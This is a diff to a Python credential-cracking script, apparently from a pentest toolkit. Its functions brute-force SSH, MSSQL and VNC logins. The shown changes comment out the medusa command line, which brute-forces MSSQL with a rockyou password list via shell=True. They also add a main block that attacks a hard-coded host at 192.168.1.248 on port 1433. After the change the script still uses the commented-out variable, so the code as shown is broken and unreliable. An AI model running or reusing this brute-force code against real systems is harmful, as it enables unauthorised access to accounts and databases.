@@ -17,7 +17,7 @@ def sshCrack(ip_address, port, root):
 
 def mssqlCrack(ip_address, port, root):
 	print ("SOMETHING HAPPENED")
-	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mssql > %sdiscovery/mssql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, root, ip_address)
+	#MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mssql > %sdiscovery/mssql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, root, ip_address)
 	print (MEDUSA)
 	
 	results = subprocess.check_output(MEDUSA, shell=True)
@@ -83,3 +83,9 @@ def vncCrack(ip_address, port, root):
 			fo.write(ip_address + "," + port + "," + line + "," + vnc + "\n")
 	fo.close()
 	return
+	
+if __name__=='__main__':
+	if sys.version_info[0] != 3 or sys.version_info[1] < 1:
+		print("\nEXIT: This script requires Python version 3.1 or higher\n")
+		sys.exit(1)
+	mssqlCrack("192.168.1.248", "1433", "/root/TEST/")
